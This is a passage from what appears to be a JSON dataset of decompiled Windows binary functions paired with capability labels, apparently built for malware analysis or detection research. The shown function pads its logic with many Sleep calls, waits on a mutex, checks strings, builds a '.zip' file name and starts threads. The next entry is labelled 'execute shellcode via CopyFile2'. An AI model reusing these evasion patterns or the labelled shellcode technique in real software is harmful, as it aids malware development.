auStack2712 [100];\n    uchar uStack2612;\n    char acStack2600 [4];\n    uint uStack2596;\n    uint uStack2592;\n    char acStack2584 [8];\n    char acStack2576 [24];\n    uchar auStack2552 [12];\n    uchar auStack2540 [308];\n    uchar auStack2232 [8];\n    uchar auStack2224 [12];\n    uchar auStack2212 [8];\n    uchar auStack2204 [12];\n    uchar auStack2192 [12];\n    uchar auStack2180 [4];\n    uchar auStack2176 [736];\n    uchar auStack1440 [8];\n    uchar auStack1432 [8];\n    uchar auStack1424 [12];\n    uchar auStack1412 [8];\n    uchar auStack1404 [444];\n    int32_t iStack960;\n    uchar uStack348;\n    uchar uStack336;\n    uchar uStack324;\n    uchar uStack320;\n    uchar uStack316;\n    uchar uStack312;\n    uchar uStack296;\n    uchar uStack292;\n    uchar uStack288;\n    uchar uStack280;\n    uchar uStack200;\n    uchar uStack192;\n    uchar uStack188;\n    uchar uStack180;\n    uchar uStack176;\n    uchar uStack168;\n    uint32_t uStack16;\n    int32_t iStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x43b0ce;\n    iStack12 = *in_FS_OFFSET;\n    uStack16 = *0x44d6a0 ^ &stack0xfffff568;\n    uStack2732 = *0x44d6a0 ^ &stack0xfffff558;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n    uStack2592 = 0xf;\n    uStack2596 = 0;\n    uStack2612 = 0;\n    uStack2736 = 2;\n    uStack4 = 0;\n    uStack2740 = 0x40eed4;\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    uStack2740 = 2;\n    uStack2744 = 0x40eed8;\n    (*pcVar2)();\n    uStack2744 = 2;\n    uStack2748 = 0x40eedc;\n    (*pcVar2)();\n    uStack2748 = 2;\n    uStack2752 = 0x40eee0;\n    (*pcVar2)();\n    uStack2752 = 2;\n    uStack2756 = 0x40eee4;\n    (*pcVar2)();\n    uStack2756 = 2;\n    uStack2760 = 0x40eee8;\n    (*pcVar2)();\n    uStack2760 = 2;\n    uStack2764 = 0x40eeec;\n    (*pcVar2)();\n    uStack2764 = 2;\n    uStack2768 = 0x40eef0;\n    (*pcVar2)();\n    uStack2768 = 2;\n    uStack2772 = 0x40eef4;\n    (*pcVar2)();\n    uStack2772 = 2;\n    uStack2776 = 0x40eef8;\n    (*pcVar2)();\n    uStack2776 = 0x40ef01;\n    fcn.00401370();\n    uStack2776 = 2;\n    uStack2780 = 0x40ef05;\n    (*pcVar2)();\n    uStack2780 = 2;\n    uStack2784 = 0x40ef09;\n    (*pcVar2)();\n    uStack2784 = 2;\n    uStack2788 = 0x40ef0d;\n    (*pcVar2)();\n    uStack2788 = 2;\n    uStack2792 = 0x40ef11;\n    (*pcVar2)();\n    uStack2792 = 2;\n    uStack2796 = 0x40ef15;\n    (*pcVar2)();\n    uStack2796 = 2;\n    uStack2800 = 0x40ef19;\n    (*pcVar2)();\n    uStack2800 = 2;\n    uStack2804 = 0x40ef1d;\n    (*pcVar2)();\n    uStack2804 = 2;\n    uStack2808 = 0x40ef21;\n    (*pcVar2)();\n    uStack2808 = 2;\n    uStack2812 = 0x40ef25;\n    (*pcVar2)();\n    uStack2812 = 2;\n    uStack2816 = 0x40ef29;\n    (*pcVar2)();\n    uStack2816 = 0x40ef2e;\n    fcn.004215f0();\n    uStack2816 = 2;\n    uStack2820 = 0x40ef32;\n    (*pcVar2)();\n    uStack2820 = 2;\n    uStack2824 = 0x40ef36;\n    (*pcVar2)();\n    uStack2824 = 2;\n    uStack2828 = 0x40ef3a;\n    (*pcVar2)();\n    uStack2828 = 2;\n    uStack2832 = 0x40ef3e;\n    (*pcVar2)();\n    uStack2832 = 2;\n    uStack2836 = 0x40ef42;\n    (*pcVar2)();\n    uStack2836 = 2;\n    uStack2840 = 0x40ef46;\n    (*pcVar2)();\n    uStack2840 = 2;\n    uStack2844 = 0x40ef4a;\n    (*pcVar2)();\n    uStack2844 = 2;\n    uStack2848 = 0x40ef4e;\n    (*pcVar2)();\n    uStack2848 = 2;\n    uStack2852 = 0x40ef52;\n    (*pcVar2)();\n    uStack2852 = 2;\n    uStack2856 = 0x40ef56;\n    (*pcVar2)();\n    uStack2856 = 2;\n    *0x44f3dc = 40000;\n    *0x44f3e8 = 0;\n    uStack2860 = 0x40ef6a;\n    (*pcVar2)();\n    uStack2860 = 2;\n    uStack2864 = 0x40ef6e;\n    (*pcVar2)();\n    uStack2864 = 2;\n    uStack2868 = 0x40ef72;\n    (*pcVar2)();\n    uStack2868 = 2;\n    uStack2872 = 0x40ef76;\n    (*pcVar2)();\n    uStack2872 = 2;\n    uStack2876 = 0x40ef7a;\n    (*pcVar2)();\n    uStack2876 = 2;\n    uStack2880 = 0x40ef7e;\n    (*pcVar2)();\n    uStack2880 = 2;\n    uStack2884 = 0x40ef82;\n    (*pcVar2)();\n    uStack2884 = 2;\n    uStack2888 = 0x40ef86;\n    (*pcVar2)();\n    uStack2888 = 2;\n    uStack2892 = 0x40ef8a;\n    (*pcVar2)();\n    uStack2892 = 2;\n    puStack2896 = 0x40ef8e;\n    (*pcVar2)();\n    puStack2896 = 0x3e8;\n    puStack2904 = &stack0xfffff780;\n    puStack2900 = NULL;\n    puStack2908 = 0x40efa1;\n    fcn.00427390();\n    puStack2896 = &stack0xfffff510;\n    puStack2900 = 0x40efb2;\n    puStack2900 = fcn.0041c640();\n    uStack168 = 1;\n    if (0xf < puStack2900[5]) {\n        puStack2900 = *puStack2900;\n    }\n    puStack2904 = &stack0xfffff77c;\n    puStack2908 = 0x40efd5;\n    (**0x45ff98)();\n    uStack176 = 0;\n    if (0xf < uStack2792) {\n        puStack2908 = uStack2812;\n        puStack2912 = 0x40efec;\n        fcn.00427a17();\n    }\n    puStack2908 = &stack0xfffff504;\n    puStack2912 = 0x40effd;\n    puStack2912 = fcn.0041c470();\n    uStack180 = 2;\n    if (0xf < puStack2912[5]) {\n        puStack2912 = *puStack2912;\n    }\n    puStack2916 = &stack0xfffff770;\n    puStack2920 = 0x40f01b;\n    (**0x45ff98)();\n    uStack188 = 0;\n    if (0xf < uStack2804) {\n        puStack2920 = uStack2824;\n        puStack2924 = 0x40f032;\n        fcn.00427a17();\n    }\n    puStack2920 = &stack0xfffff4f8;\n    puStack2924 = 0x40f043;\n    puStack2924 = fcn.0041c3a0();\n    uStack192 = 3;\n    if (0xf < puStack2924[5]) {\n        puStack2924 = *puStack2924;\n    }\n    puStack2928 = &stack0xfffff764;\n    puStack2932 = 0x40f061;\n    (**0x45ff98)();\n    uStack200 = 0;\n    if (0xf < uStack2816) {\n        puStack2932 = uStack2836;\n        uStack2936 = 0x40f078;\n        fcn.00427a17();\n    }\n    puStack2932 = &stack0xfffff75c;\n    uStack2936 = 0;\n    uStack2940 = 0x1f0003;\n    puStack2944 = 0x40f08f;\n    *0x44f3e4 = (**0x45fdf8)();\n    while (*0x44f3e4 != 0) {\n        uStack2948 = 0x40f09f;\n        puStack2944 = *0x44f3e4;\n        (**0x45fe30)();\n        uStack2948 = 5000;\n        puStack2952 = 0x40f0aa;\n        (**0x45fe08)();\n        puStack2952 = &stack0xfffff748;\n        uStack2956 = 0;\n        uStack2960 = 0x1f0003;\n        uStack2964 = 0x40f0be;\n        *0x44f3e4 = (**0x45fdf8)();\n    }\n    puStack2944 = &stack0xfffff750;\n    uStack2948 = 0;\n    puStack2952 = NULL;\n    uStack2956 = 0;\n    uStack2960 = 0x40f0d8;\n    *0x44f3e4 = (**0x45ff80)();\n    uStack2960 = 2;\n    uStack2964 = 0x40f0e1;\n    (*pcVar2)();\n    uStack2964 = 2;\n    uStack2968 = 0x40f0e5;\n    (*pcVar2)();\n    uStack2968 = 2;\n    uStack2972 = 0x40f0e9;\n    (*pcVar2)();\n    uStack2972 = 2;\n    uStack2976 = 0x40f0ed;\n    (*pcVar2)();\n    uStack2976 = 2;\n    uStack2980 = 0x40f0f1;\n    (*pcVar2)();\n    uStack2980 = 2;\n    uStack2984 = 0x40f0f5;\n    (*pcVar2)();\n    uStack2984 = 2;\n    puStack2988 = 0x40f0f9;\n    (*pcVar2)();\n    puStack2988 = 0x2;\n    puStack2992 = 0x40f0fd;\n    (*pcVar2)();\n    puStack2992 = 0x2;\n    uStack2996 = 0x40f101;\n    (*pcVar2)();\n    uStack2996 = 2;\n    puStack3000 = 0x40f105;\n    (*pcVar2)();\n    puStack3000 = 0x104;\n    puStack3008 = &stack0xfffff614;\n    puStack3004 = NULL;\n    puStack3012 = 0x40f118;\n    fcn.00427390();\n    puStack3000 = 0x4449c8;\n    puStack3004 = &stack0xfffff614;\n    puStack3008 = 0x40f12e;\n    (**0x45ff98)();\n    puStack3008 = &stack0xfffff4a0;\n    puStack3012 = 0x40f13c;\n    puStack3012 = fcn.0040af00();\n    uStack280 = 4;\n    if (0xf < puStack3012[5]) {\n        puStack3012 = *puStack3012;\n    }\n    puStack3016 = &stack0xfffff608;\n    puStack3020 = 0x40f15a;\n    (**0x45ff98)();\n    uStack288 = 0;\n    if (0xf < puStack2904) {\n        puStack3020 = puStack2924;\n        puStack3024 = 0x40f171;\n        fcn.00427a17();\n    }\n    while( true ) {\n        puStack3020 = 0x4449cc;\n        puStack2992 = &stack0xfffff418;\n        puStack3052 = &stack0xfffff418;\n        pcStack3056 = 0x40f18c;\n        fcn.0040af60();\n        puStack2988 = &stack0xfffff3f8;\n        puStack3084 = &stack0xfffff3f8;\n        uStack292 = 6;\n        iStack3088 = 0x40f1a7;\n        fcn.0040aff0();\n        iStack3088 = 6;\n        uStack296 = 0;\n        puStack3092 = 0x40f1b5;\n        fcn.0040e6a0();\n        pcStack3032 = *0x44d040;\n        if (*0x44d054 < 0x10) {\n            pcStack3032 = 0x44d040;\n        }\n        uStack3028 = 0x4449d0;\n        uStack3036 = 0x40f1d6;\n        iVar3 = (**0x45ffc8)();\n        if (iVar3 != 0) {\n            puStack3000 = &stack0xfffff40c;\n            pcStack3064 = &stack0xfffff5f0;\n            pcStack3040 = 0xf;\n            uStack3044 = 0;\n            pcStack3060 = pcStack3060 & 0xffffff00;\n            do {\n                cVar1 = *pcStack3064;\n                pcStack3064 = pcStack3064 + 1;\n            } while (cVar1 != '\\0');\n            pcStack3064 = pcStack3064 + -&stack0xfffff5f1;\n            puStack3068 = &stack0xfffff5f0;\n            iStack3072 = 0x40f219;\n            fcn.004052f0();\n            puStack3016 = &stack0xfffff3e8;\n            uStack3100 = 0xffffffff;\n            uStack3104 = 0;\n            puStack3076 = 0xf;\n            uStack3080 = 0;\n            puStack3108 = 0x44d040;\n            uStack312 = 7;\n            uStack3096 = uStack3096 & 0xffffff00;\n            uStack3112 = 0x40f243;\n            fcn.00405200();\n            uStack324 = 0;\n            uStack3112 = 0x40f24f;\n            fcn.0040e890();\n        }\n        pcStack3040 = *0x44d040;\n        if (*0x44d054 < 0x10) {\n            pcStack3040 = 0x44d040;\n        }\n        uStack3036 = 0x4449d8;\n        uStack3044 = 0x40f270;\n        iVar3 = (**0x45ffc8)();\n        if (iVar3 != 0) break;\n        uStack3044 = 0x4449e0;\n        puStack3008 = &stack0xfffff400;\n        puStack3076 = &stack0xfffff400;\n        uStack3080 = 0x40f290;\n        fcn.0040af90();\n        puStack3020 = &stack0xfffff3e0;\n        puStack3108 = &stack0xfffff3e0;\n        uStack316 = 9;\n        uStack3112 = 0x40f2ab;\n        fcn.0040aff0();\n        uStack3112 = 6;\n        uStack320 = 0;\n        uStack3116 = 0x40f2b9;\n        fcn.0040e6a0();\n        pcStack3056 = *0x44d040;\n        if (*0x44d054 < 0x10) {\n            pcStack3056 = 0x44d040;\n        }\n        puStack3052 = 0x4449e4;\n        pcStack3060 = 0x40f2da;\n        iVar3 = (**0x45ffc8)();\n        if (iVar3 != 0) {\n            puStack3024 = &stack0xfffff3f4;\n            pcVar4 = &stack0xfffff5d8;\n            pcStack3064 = 0xf;\n            puStack3068 = NULL;\n            puStack3084 = puStack3084 & 0xffffff00;\n            do {\n                cVar1 = *pcVar4;\n                pcVar4 = pcVar4 + 1;\n            } while (cVar1 != '\\0');\n            iStack3088 = pcVar4 - &stack0xfffff5d9;\n            puStack3092 = &stack0xfffff5d8;\n            uStack3096 = 0x40f319;\n            fcn.004052f0();\n            pcStack3040 = &stack0xfffff3d0;\n            pcStack3124 = 0xffffffff;\n            puStack3128 = NULL;\n            uStack3100 = 0xf;\n            uStack3104 = 0;\n            puStack3132 = 0x44d040;\n            uStack336 = 10;\n            uStack3120 = uStack3120 & 0xffffff00;\n            puStack3136 = 0x40f343;\n            fcn.00405200();\n            uStack348 = 0;\n            puStack3136 = 0x40f34f;\n            fcn.0040e890();\n        }\n        pcStack3064 = *0x44d040;\n        if (*0x44d054 < 0x10) {\n            pcStack3064 = 0x44d040;\n        }\n        pcStack3060 = 0x4449ec;\n        puStack3068 = 0x40f370;\n        iVar3 = (**0x45ffc8)();\n        if (iVar3 != 0) break;\n        puStack3008 = &stack0xfffff404;\n        pcVar4 = &stack0xfffff5e8;\n        uStack3048 = 0xf;\n        puStack3052 = NULL;\n        puStack3068 = puStack3068 & 0xffffff00;\n        do {\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        iStack3072 = pcVar4 - &stack0xfffff5e9;\n        puStack3076 = &stack0xfffff5e8;\n        uStack3080 = 0x40f3b0;\n        fcn.004052f0();\n        puStack3024 = &stack0xfffff3e0;\n        puStack3108 = &stack0xfffff3e0;\n        uStack320 = 0xb;\n        uStack3112 = 0x40f3cb;\n        fcn.0040afc0();\n        uStack324 = 0;\n        uStack3112 = 0x40f3d7;\n        fcn.0040e890();\n        pcStack3060 = *0x44d040;\n        if (*0x44d054 < 0x10) {\n            pcStack3060 = 0x44d040;\n        }\n        pcStack3056 = 0x444a00;\n        pcStack3064 = 0x40f3f8;\n        iVar3 = (**0x45ffc8)();\n        if (iVar3 != 0) break;\n        uStack3044 = 120000;\n        uStack3048 = 0x40f407;\n        (**0x45fe08)();\n    }\n    uStack3044 = 2;\n    uStack3048 = 0x40f410;\n    (*pcVar2)();\n    uStack3048 = 2;\n    puStack3052 = 0x40f414;\n    (*pcVar2)();\n    puStack3052 = 0x2;\n    pcStack3056 = 0x40f418;\n    (*pcVar2)();\n    pcStack3056 = 0x2;\n    pcStack3060 = 0x40f41c;\n    (*pcVar2)();\n    pcStack3060 = 0x2;\n    pcStack3064 = 0x40f420;\n    (*pcVar2)();\n    pcStack3064 = 0x2;\n    puStack3068 = 0x40f424;\n    (*pcVar2)();\n    puStack3068 = 0x2;\n    iStack3072 = 0x40f428;\n    (*pcVar2)();\n    iStack3072 = 2;\n    puStack3076 = 0x40f42c;\n    (*pcVar2)();\n    puStack3076 = 0x2;\n    uStack3080 = 0x40f430;\n    (*pcVar2)();\n    uStack3080 = 2;\n    puStack3084 = 0x40f434;\n    (*pcVar2)();\n    puStack3084 = NULL;\n    iStack3088 = 90000000;\n    puStack3092 = NULL;\n    uStack3096 = 0x40f440;\n    *0x44f3e0 = fcn.00425310();\n    puStack3084 = 0x2;\n    iStack3088 = 0x40f44c;\n    (*pcVar2)();\n    iStack3088 = 2;\n    puStack3092 = 0x40f450;\n    (*pcVar2)();\n    puStack3092 = 0x2;\n    uStack3096 = 0x40f454;\n    (*pcVar2)();\n    uStack3096 = 2;\n    uStack3100 = 0x40f458;\n    (*pcVar2)();\n    uStack3100 = 2;\n    uStack3104 = 0x40f45c;\n    (*pcVar2)();\n    uStack3104 = 2;\n    puStack3108 = 0x40f460;\n    (*pcVar2)();\n    puStack3108 = 0x2;\n    uStack3112 = 0x40f464;\n    (*pcVar2)();\n    uStack3112 = 2;\n    uStack3116 = 0x40f468;\n    (*pcVar2)();\n    uStack3116 = 2;\n    uStack3120 = 0x40f46c;\n    (*pcVar2)();\n    uStack3120 = 2;\n    pcStack3124 = 0x40f470;\n    (*pcVar2)();\n    pcStack3124 = 0x3e8;\n    puStack3132 = &stack0xfffffa84;\n    puStack3128 = NULL;\n    puStack3136 = 0x40f483;\n    fcn.00427390();\n    pcStack3124 = *0x44d040;\n    if (*0x44d054 < 0x10) {\n        pcStack3124 = 0x44d040;\n    }\n    puStack3128 = &stack0xfffffa84;\n    puStack3132 = 0x40f4a7;\n    (**0x45ff98)();\n    puStack3132 = 0x444a24;\n    puStack3136 = &stack0xfffffa7c;\n    uStack3140 = 0x40f4ba;\n    (**0x45ff98)();\n    uStack3140 = 10;\n    uStack3144 = 0x40f4c5;\n    uStack3144 = fcn.0041d100();\n    puStack3148 = &stack0xfffffa70;\n    pcStack3152 = 0x40f4d4;\n    (**0x45ff98)();\n    pcStack3152 = \".zip\";\n    puStack3156 = &stack0xfffffa68;\n    puStack3160 = 0x40f4e7;\n    (**0x45ff98)();\n    puStack3160 = &stack0xfffffa60;\n    uStack3164 = 0x40f4f4;\n    uStack3208 = fcn.00412530();\n    puStack3160 = 0x2;\n    uStack3164 = 0x40f4ff;\n    (*pcVar2)();\n    uStack3164 = 2;\n    uStack3168 = 0x40f503;\n    (*pcVar2)();\n    uStack3168 = 2;\n    uStack3172 = 0x40f507;\n    (*pcVar2)();\n    uStack3172 = 2;\n    uStack3176 = 0x40f50b;\n    (*pcVar2)();\n    uStack3176 = 2;\n    uStack3180 = 0x40f50f;\n    (*pcVar2)();\n    uStack3180 = 2;\n    uStack3184 = 0x40f513;\n    (*pcVar2)();\n    uStack3184 = 2;\n    uStack3188 = 0x40f517;\n    (*pcVar2)();\n    uStack3188 = 2;\n    uStack3192 = 0x40f51b;\n    (*pcVar2)();\n    uStack3192 = 2;\n    uStack3196 = 0x40f51f;\n    (*pcVar2)();\n    uStack3196 = 2;\n    uStack3200 = 0x40f523;\n    (*pcVar2)();\n    uStack3200 = 0x444643;\n    uStack3212 = 0x40f52f;\n    *0x44f3d4 = fcn.00409d10();\n    uStack3200 = 2;\n    uStack3208._4_4_ = 0x40f53b;\n    (*pcVar2)();\n    uStack3208._4_4_ = 2;\n    uStack3208._0_4_ = 0x40f53f;\n    (*pcVar2)();\n    uStack3208._0_4_ = 2;\n    uStack3212 = 0x40f543;\n    (*pcVar2)();\n    uStack3212 = 2;\n    uStack3216 = 0x40f547;\n    (*pcVar2)();\n    uStack3216 = 2;\n    uStack3220 = 0x40f54b;\n    (*pcVar2)();\n    uStack3220 = 2;\n    uStack3224 = 0x40f54f;\n    (*pcVar2)();\n    uStack3224 = 2;\n    uStack3228 = 0x40f553;\n    (*pcVar2)();\n    uStack3228 = 2;\n    uStack3232 = 0x40f557;\n    (*pcVar2)();\n    uStack3232 = 2;\n    uStack3236 = 0x40f55b;\n    (*pcVar2)();\n    uStack3236 = 2;\n    puStack3240 = 0x40f55f;\n    (*pcVar2)();\n    puStack3240 = &stack0xfffff3f8;\n    puStack3244 = &stack0xfffff374;\n    uStack3248 = 1;\n    uStack3252 = *0x44f1b0;\n    uStack3212 = 0;\n    uStack3256 = *0x44f3d4;\n    uStack3260 = 0x40f585;\n    fcn.00407c60();\n    puStack3240 = uStack2784;\n    puStack3244 = NULL;\n    uStack3248 = 0x40f597;\n    uStack3248 = (**0x45fff4)();\n    uStack3252 = 0x40f59e;\n    uStack3296 = (**0x45ff7c)();\n    uStack3252 = uStack2796;\n    uStack3260 = uStack3224;\n    uStack3264 = *0x44f3d4;\n    uStack3268 = 0x40f5b9;\n    uStack3256 = uStack3296;\n    fcn.0040a020();\n    uVar5 = uStack2796;\n    uStack3252 = 2;\n    uStack3256 = 0x40f5c7;\n    (*pcVar2)();\n    uStack3256 = 2;\n    uStack3260 = 0x40f5cb;\n    (*pcVar2)();\n    uStack3260 = 2;\n    uStack3264 = 0x40f5cf;\n    (*pcVar2)();\n    uStack3264 = 2;\n    uStack3268 = 0x40f5d3;\n    (*pcVar2)();\n    uStack3268 = 2;\n    uStack3272 = 0x40f5d7;\n    (*pcVar2)();\n    uStack3272 = 2;\n    uStack3276 = 0x40f5db;\n    (*pcVar2)();\n    uStack3276 = 2;\n    uStack3280 = 0x40f5df;\n    (*pcVar2)();\n    uStack3280 = 2;\n    uStack3284 = 0x40f5e3;\n    (*pcVar2)();\n    uStack3284 = 2;\n    uStack3288 = 0x40f5e7;\n    (*pcVar2)();\n    uStack3288 = 2;\n    uStack3292 = 0x40f5eb;\n    (*pcVar2)();\n    uStack3292 = uVar5;\n    uStack3232 = CONCAT31(CONCAT12(*0x44f423, CONCAT11(*0x44f421, *0x44f420)), 1);\n    uStack3228._0_2_ = CONCAT11(*0x44f425, *0x44f424);\n    uStack3228 = uStack3228 & 0xff000000 | (*0x44f422 != '\\0') << 0x10 | uStack3228;\n    uStack3200 = *0x44f3e0;\n    uStack3300 = 0x40f646;\n    fcn.0041b090();\n    uStack3300 = 2;\n    uStack3304 = 0x40f64a;\n    (*pcVar2)();\n    uStack3304 = 2;\n    uStack3308 = 0x40f64e;\n    (*pcVar2)();\n    uStack3308 = 2;\n    uStack3312 = 0x40f652;\n    (*pcVar2)();\n    uStack3312 = 2;\n    uStack3316 = 0x40f656;\n    (*pcVar2)();\n    uStack3316 = 2;\n    uStack3320 = 0x40f65a;\n    (*pcVar2)();\n    uStack3320 = 2;\n    uStack3324 = 0x40f65e;\n    (*pcVar2)();\n    uStack3324 = 2;\n    uStack3328 = 0x40f662;\n    (*pcVar2)();\n    uStack3328 = 2;\n    uStack3332 = 0x40f666;\n    (*pcVar2)();\n    uStack3332 = 2;\n    uStack3336 = 0x40f66a;\n    (*pcVar2)();\n    uStack3336 = 2;\n    uStack3340 = 0x40f66e;\n    (*pcVar2)();\n    if (*0x44f428 != 0) {\n        uStack3340 = 0x40f67b;\n        fcn.0040ba60();\n    }\n    uStack3340 = 2;\n    uStack3344 = 0x40f67f;\n    (*pcVar2)();\n    uStack3344 = 2;\n    uStack3348 = 0x40f683;\n    (*pcVar2)();\n    uStack3348 = 2;\n    uStack3352 = 0x40f687;\n    (*pcVar2)();\n    uStack3352 = 2;\n    uStack3356 = 0x40f68b;\n    (*pcVar2)();\n    uStack3356 = 2;\n    uStack3360 = 0x40f68f;\n    (*pcVar2)();\n    uStack3360 = 2;\n    uStack3364 = 0x40f693;\n    (*pcVar2)();\n    uStack3364 = 2;\n    uStack3368 = 0x40f697;\n    (*pcVar2)();\n    uStack3368 = 2;\n    uStack3372 = 0x40f69b;\n    (*pcVar2)();\n    uStack3372 = 2;\n    uStack3376 = 0x40f69f;\n    (*pcVar2)();\n    uStack3376 = 2;\n    uStack3380 = 0x40f6a3;\n    (*pcVar2)();\n    uStack3380 = *0x44f3e0;\n    uStack3384 = 0x40f6af;\n    fcn.0040cac0();\n    uStack3380 = 2;\n    uStack3384 = 0x40f6b6;\n    (*pcVar2)();\n    uStack3384 = 2;\n    uStack3388 = 0x40f6ba;\n    (*pcVar2)();\n    uStack3388 = 2;\n    uStack3392 = 0x40f6be;\n    (*pcVar2)();\n    uStack3392 = 2;\n    uStack3396 = 0x40f6c2;\n    (*pcVar2)();\n    uStack3396 = 2;\n    uStack3400 = 0x40f6c6;\n    (*pcVar2)();\n    uStack3400 = 2;\n    uStack3404 = 0x40f6ca;\n    (*pcVar2)();\n    uStack3404 = 2;\n    uStack3408 = 0x40f6ce;\n    (*pcVar2)();\n    uStack3408 = 2;\n    uStack3412 = 0x40f6d2;\n    (*pcVar2)();\n    uStack3412 = 2;\n    uStack3416 = 0x40f6d6;\n    (*pcVar2)();\n    uStack3416 = 2;\n    uStack3420 = 0x40f6da;\n    (*pcVar2)();\n    if (*0x44f422 != '\\0') {\n        uStack3420 = *0x44f3e0;\n        uStack3424 = 0x40f6f1;\n        fcn.00410950();\n    }\n    uStack3420 = 2;\n    uStack3424 = 0x40f6f5;\n    (*pcVar2)();\n    uStack3424 = 2;\n    uStack3428 = 0x40f6f9;\n    (*pcVar2)();\n    uStack3428 = 2;\n    uStack3432 = 0x40f6fd;\n    (*pcVar2)();\n    uStack3432 = 2;\n    uStack3436 = 0x40f701;\n    (*pcVar2)();\n    uStack3436 = 2;\n    uStack3440 = 0x40f705;\n    (*pcVar2)();\n    uStack3440 = 2;\n    uStack3444 = 0x40f709;\n    (*pcVar2)();\n    uStack3444 = 2;\n    uStack3448 = 0x40f70d;\n    (*pcVar2)();\n    uStack3448 = 2;\n    uStack3452 = 0x40f711;\n    (*pcVar2)();\n    uStack3452 = 2;\n    uStack3456 = 0x40f715;\n    (*pcVar2)();\n    uStack3456 = 2;\n    uStack3460 = 0x40f719;\n    (*pcVar2)();\n    if (*0x44f427 != '\\0') {\n        uStack3460 = *0x44f3e0;\n        uStack3464 = *0x44f3d0;\n        uStack3468 = 0x40f734;\n        fcn.0040d930();\n    }\n    uStack3460 = 2;\n    uStack3464 = 0x40f73b;\n    (*pcVar2)();\n    uStack3464 = 2;\n    uStack3468 = 0x40f73f;\n    (*pcVar2)();\n    uStack3468 = 2;\n    uStack3472 = 0x40f743;\n    (*pcVar2)();\n    uStack3472 = 2;\n    uStack3476 = 0x40f747;\n    (*pcVar2)();\n    uStack3476 = 2;\n    uStack3480 = 0x40f74b;\n    (*pcVar2)();\n    uStack3480 = 2;\n    uStack3484 = 0x40f74f;\n    (*pcVar2)();\n    uStack3484 = 2;\n    uStack3488 = 0x40f753;\n    (*pcVar2)();\n    uStack3488 = 2;\n    uStack3492 = 0x40f757;\n    (*pcVar2)();\n    uStack3492 = 2;\n    uStack3496 = 0x40f75b;\n    (*pcVar2)();\n    uStack3496 = 2;\n    uStack3500 = 0x40f75f;\n    (*pcVar2)();\n    if (*0x44f426 != '\\0') {\n        uStack3500 = *0x44f3e0;\n        uStack3504 = 0x46;\n        uStack3508 = 0x40f774;\n        fcn.0041d360();\n    }\n    uStack3500 = 2;\n    uStack3504 = 0x40f77b;\n    (*pcVar2)();\n    uStack3504 = 2;\n    uStack3508 = 0x40f77f;\n    (*pcVar2)();\n    uStack3508 = 2;\n    uStack3512 = 0x40f783;\n    (*pcVar2)();\n    uStack3512 = 2;\n    uStack3516 = 0x40f787;\n    (*pcVar2)();\n    uStack3516 = 2;\n    uStack3520 = 0x40f78b;\n    (*pcVar2)();\n    uStack3520 = 2;\n    uStack3524 = 0x40f78f;\n    (*pcVar2)();\n    uStack3524 = 2;\n    uStack3528 = 0x40f793;\n    (*pcVar2)();\n    uStack3528 = 2;\n    uStack3532 = 0x40f797;\n    (*pcVar2)();\n    uStack3532 = 2;\n    uStack3536 = 0x40f79b;\n    (*pcVar2)();\n    uStack3536 = 2;\n    puStack3540 = 0x40f79f;\n    (*pcVar2)();\n    puStack3540 = &stack0xfffff25c;\n    puStack3544 = &stack0xfffff258;\n    uStack3548 = *0x44f3e0;\n    uStack3552 = 0x40f7b4;\n    fcn.00426780();\n    puStack3540 = 0x2;\n    puStack3544 = 0x40f7bb;\n    (*pcVar2)();\n    puStack3544 = 0x2;\n    uStack3548 = 0x40f7bf;\n    (*pcVar2)();\n    uStack3548 = 2;\n    uStack3552 = 0x40f7c3;\n    (*pcVar2)();\n    uStack3552 = 2;\n    uStack3556 = 0x40f7c7;\n    (*pcVar2)();\n    uStack3556 = 2;\n    uStack3560 = 0x40f7cb;\n    (*pcVar2)();\n    uStack3560 = 2;\n    uStack3564 = 0x40f7cf;\n    (*pcVar2)();\n    uStack3564 = 2;\n    uStack3568 = 0x40f7d3;\n    (*pcVar2)();\n    uStack3568 = 2;\n    uStack3572 = 0x40f7d7;\n    (*pcVar2)();\n    uStack3572 = 2;\n    uStack3576 = 0x40f7db;\n    (*pcVar2)();\n    uStack3576 = 2;\n    uStack3580 = 0x40f7df;\n    (*pcVar2)();\n    uStack3580 = uStack3532;\n    uStack3584 = uStack3536;\n    puStack3588 = &stack0xfffff22c;\n    puStack3592 = &stack0xfffff220;\n    puStack3540 = NULL;\n    uStack3552 = 0;\n    fcn.0040a630();\n    uStack3580 = 2;\n    uStack3584 = 0x40f807;\n    (*pcVar2)();\n    uStack3584 = 2;\n    puStack3588 = 0x40f80b;\n    (*pcVar2)();\n    puStack3588 = 0x2;\n    puStack3592 = 0x40f80f;\n    (*pcVar2)();\n    puStack3592 = 0x2;\n    (*pcVar2)();\n    (*pcVar2)(2);\n    (*pcVar2)(2);\n    (*pcVar2)(2);\n    (*pcVar2)(2);\n    (*pcVar2)(2);\n    (*pcVar2)(2);\n    uStack3568 = puStack3592;\n    uStack3564 = uStack3580;\n    (**0x45ffd0)(0, 0, 0x40c700, &stack0xfffff210, 0, 0);\n    iVar3 = 0;\n    while (*0x44f42c == 0) {\n        if (*0x44f430 != 0) goto code_r0x0040f8b3;\n        if (iVar3 == 0x3c) {\n            (**0x45ffd0)(0, 0, 0x40c700, &stack0xfffff1f8, 0, 0);\n            iVar3 = 0;\n        }\n        (**0x45fe08)(1000);\n        iVar3 = iVar3 + 1;\n    }\n    do {\n        (**0x45fe08)(1000);\n    } while (*0x44f434 == 0);\ncode_r0x0040f8b3:\n    *0x44f3e0 = 0;\n    *0x44f3e4 = 0;\n    fcn.004207d0();\n    (*pcVar2)(2);\n    (*pcVar2)(2);\n    (*pcVar2)(2);\n    (*pcVar2)(2);\n    uVar5 = 2;\n    (*pcVar2)();\n    (*pcVar2)(2);\n    (*pcVar2)(2);\n    (*pcVar2)(2);\n    (*pcVar2)(2);\n    (*pcVar2)(2);\n    if (0xf < puStack3540) {\n        fcn.00427a17(uStack3560);\n    }\n    *in_FS_OFFSET = iStack960;\n    fcn.00427841(uVar5);\n    return;\n}\n",
        "token_count": 11677
    },
    "004100c0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
